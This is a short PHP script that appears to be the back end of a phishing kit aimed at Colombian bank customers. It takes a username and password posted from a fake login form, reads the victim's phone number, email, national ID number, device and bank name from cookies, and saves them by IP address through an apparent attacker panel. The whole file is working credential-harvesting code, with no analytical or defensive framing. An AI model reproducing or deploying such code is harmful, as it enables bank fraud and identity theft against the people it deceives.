<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$contrasena = $ifilter->process($_POST['pas']);

$celular = $_COOKIE['celular'];
$correo = $_COOKIE['correo'];
$cedula = $_COOKIE['cedula'];
$persona = $_COOKIE['persona'];
$dispositivo = $_COOKIE['dispositivo'];
$nombrebanco = $_COOKIE['nombrebanco'];


$ip = $_SERVER['REMOTE_ADDR'];
$registro = get_id($ip);


if ($registro){	
	upgrade_user($usuario,$contrasena,$registro);
}else{
	create_item($usuario,$contrasena,$dispositivo,$nombrebanco,$celular,$persona,$correo,$cedula);	
}
?>